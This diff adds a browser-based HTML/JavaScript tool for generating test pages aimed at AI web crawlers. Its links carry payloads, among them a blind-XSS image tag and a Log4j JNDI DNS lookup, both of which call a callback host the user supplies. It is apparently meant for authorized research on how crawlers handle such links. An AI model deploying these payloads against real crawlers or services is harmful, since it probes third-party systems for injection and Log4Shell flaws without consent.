@@ -1,0 +1,188 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Generate bounded pages for authorized AI crawler research.">
+  <title>AI crawler test-page generator</title>
+  <style>
+    :root { color-scheme: light dark; font-family: system-ui, sans-serif; }
+    body { max-width: 72rem; margin: 2rem auto; padding: 0 1rem 3rem; }
+    form { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 1rem; }
+    label { display: grid; gap: .35rem; font-weight: 600; }
+    .wide, .actions, #error { grid-column: 1 / -1; }
+    input, select, textarea, button { font: inherit; padding: .6rem; }
+    textarea { min-height: 5rem; resize: vertical; }
+    button { cursor: pointer; }
+    .actions { display: flex; gap: .6rem; flex-wrap: wrap; }
+    #error { color: #c62828; min-height: 1.5rem; }
+    #output { min-height: 14rem; width: 100%; box-sizing: border-box; }
+    iframe { width: 100%; min-height: 18rem; border: 1px solid #8888; background: white; }
+    small { font-weight: 400; }
+    @media (max-width: 45rem) { form { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+  <h1>AI crawler test-page generator</h1>
+  <p>Everything runs in this browser. No requests are sent to target URLs.</p>
+
+  <form id="generator">
+    <label class="wide">Authorized target URLs, one per line
+      <textarea id="targets" required>https://owned.example.test/resource</textarea>
+    </label>
+    <label>Number of links
+      <input id="count" type="number" min="1" max="1000" value="10" required>
+    </label>
+    <label>Page title
+      <input id="title" value="Authorized AI crawler test">
+    </label>
+    <label>Link-text mode
+      <select id="textMode">
+        <option value="increment">Increment</option>
+        <option value="cycle">Cycle through list</option>
+        <option value="random">Random</option>
+      </select>
+    </label>
+    <label>Text template/list <small>Use {n} for the link number</small>
+      <textarea id="texts">item {n}</textarea>
+    </label>
+    <label>Payload
+      <select id="payload">
+        <option value="marker">Unique marker</option>
+        <option value="cache-bust">Cache-bust marker</option>
+        <option value="blind-xss">Passive blind-XSS image marker</option>
+        <option value="log4j-dns">DNS-only Log4j marker</option>
+        <option value="custom">Custom template</option>
+      </select>
+    </label>
+    <label>Experiment token <small>Random when empty</small>
+      <input id="token" placeholder="demo-1">
+    </label>
+    <label>Payload position
+      <select id="position">
+        <option value="query">Query parameter</option>
+        <option value="path">Path segment</option>
+      </select>
+    </label>
+    <label>Query parameter
+      <input id="parameter" value="ai_bot_poc">
+    </label>
+    <label>Controlled callback URL/host
+      <input id="callback" placeholder="https://callback.example.test">
+    </label>
+    <label>Custom payload <small>{n}, {target}, {token}, {callback}</small>
+      <input id="custom" value="research-marker-{n}">
+    </label>
+    <div id="error" role="alert" aria-live="polite"></div>
+    <div class="actions">
+      <button type="submit">Generate preview</button>
+      <button id="download" type="button" disabled>Download generated HTML</button>
+    </div>
+  </form>
+
+  <h2>Generated source</h2>
+  <textarea id="output" readonly aria-label="Generated HTML source"></textarea>
+  <h2>Preview</h2>
+  <iframe id="preview" title="Generated page preview" sandbox></iframe>
+
+  <script>
+    const byId = id => document.getElementById(id);
+    let generated = "";
+
+    function escapeHtml(value) {
+      return value.replaceAll("&", "&amp;").replaceAll("<", "&lt;")
+        .replaceAll(">", "&gt;").replaceAll('"', "&quot;").replaceAll("'", "&#39;");
+    }
+
+    function randomText(length = 12) {
+      const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+      const values = crypto.getRandomValues(new Uint8Array(length));
+      return Array.from(values, value => alphabet[value % alphabet.length]).join("");
+    }
+
+    function callbackHost(value) {
+      const url = new URL(value.includes("://") ? value : `https://${value}`);
+      if (!url.hostname) throw new Error("The callback must contain a hostname.");
+      return url.hostname;
+    }
+
+    function payloadFor(kind, n, target, token, callback, custom) {
+      if (kind === "marker") return `ai-bot-poc-${token}-${n}`;
+      if (kind === "cache-bust") return `cb-${token}-${n}`;
+      if (kind === "blind-xss") {
+        const url = new URL(callback);
+        if (!['http:', 'https:'].includes(url.protocol)) throw new Error("The blind-XSS callback must use HTTP(S).");
+        return `<img src="${callback.replace(/\/$/, '')}/ai-bot-poc/${token}/${n}" alt="">`;
+      }
+      if (kind === "log4j-dns") return `\${jndi:dns://${callbackHost(callback)}/ai-bot-poc-${token}-${n}}`;
+      if (!custom) throw new Error("A custom payload template is required.");
+      return custom.replaceAll("{n}", n).replaceAll("{target}", target)
+        .replaceAll("{token}", token).replaceAll("{callback}", callback);
+    }
+
+    function addPayload(target, payload, position, parameter) {
+      const url = new URL(target);
+      if (!['http:', 'https:'].includes(url.protocol)) throw new Error(`Target must use HTTP(S): ${target}`);
+      url.hash = "";
+      if (position === "path") url.pathname = `${url.pathname.replace(/\/$/, '')}/${encodeURIComponent(payload)}`;
+      else url.searchParams.append(parameter, payload);
+      return url.href;
+    }
+
+    function makePage() {
+      const targets = byId("targets").value.split(/\r?\n/).map(x => x.trim()).filter(x => x && !x.startsWith("#"));
+      const count = Number(byId("count").value);
+      if (!targets.length) throw new Error("Enter at least one target URL.");
+      if (!Number.isInteger(count) || count < 1 || count > 1000) throw new Error("Link count must be between 1 and 1,000.");
+
+      targets.forEach(target => {
+        const url = new URL(target);
+        if (!['http:', 'https:'].includes(url.protocol)) throw new Error(`Target must use HTTP(S): ${target}`);
+      });
+      const parameter = byId("parameter").value;
+      if (!parameter || /[&=?#]/.test(parameter)) throw new Error("Enter a simple query-parameter name.");
+      const kind = byId("payload").value;
+      const callback = byId("callback").value.trim();
+      if ((kind === "blind-xss" || kind === "log4j-dns") && !callback) throw new Error("This payload requires a controlled callback.");
+
+      const token = byId("token").value.trim() || randomText(8);
+      const mode = byId("textMode").value;
+      const texts = byId("texts").value.split(/\r?\n/).filter(Boolean);
+      const title = byId("title").value;
+      const links = [];
+      for (let n = 1; n <= count; n++) {
+        const target = targets[(n - 1) % targets.length];
+        const payload = payloadFor(kind, n, target, token, callback, byId("custom").value);
+        const href = addPayload(target, payload, byId("position").value, parameter);
+        let label = `item ${n}`;
+        if (mode === "random") label = randomText();
+        else if (mode === "increment") label = (texts[0] || "item {n}").replaceAll("{n}", n);
+        else label = (texts[(n - 1) % (texts.length || 1)] || "item {n}").replaceAll("{n}", n);
+        links.push(`    <li><a href="${escapeHtml(href)}">${escapeHtml(label)}</a></li>`);
+      }
+      const safeTitle = escapeHtml(title);
+      return `<!doctype html>\n<html lang="en">\n<head>\n  <meta charset="utf-8">\n  <meta name="viewport" content="width=device-width, initial-scale=1">\n  <title>${safeTitle}</title>\n</head>\n<body>\n  <h1>${safeTitle}</h1>\n  <ol>\n${links.join("\n")}\n  </ol>\n</body>\n</html>\n`;
+    }
+
+    byId("generator").addEventListener("submit", event => {
+      event.preventDefault();
+      byId("error").textContent = "";
+      try {
+        generated = makePage();
+        byId("output").value = generated;
+        byId("preview").srcdoc = generated;
+        byId("download").disabled = false;
+      } catch (error) {
+        byId("error").textContent = error.message;
+      }
+    });
+
+    byId("download").addEventListener("click", () => {
+      const url = URL.createObjectURL(new Blob([generated], {type: "text/html"}));
+      const link = Object.assign(document.createElement("a"), {href: url, download: "poc.html"});
+      link.click();
+      URL.revokeObjectURL(url);
+    });
+  </script>
+</body>
+</html>
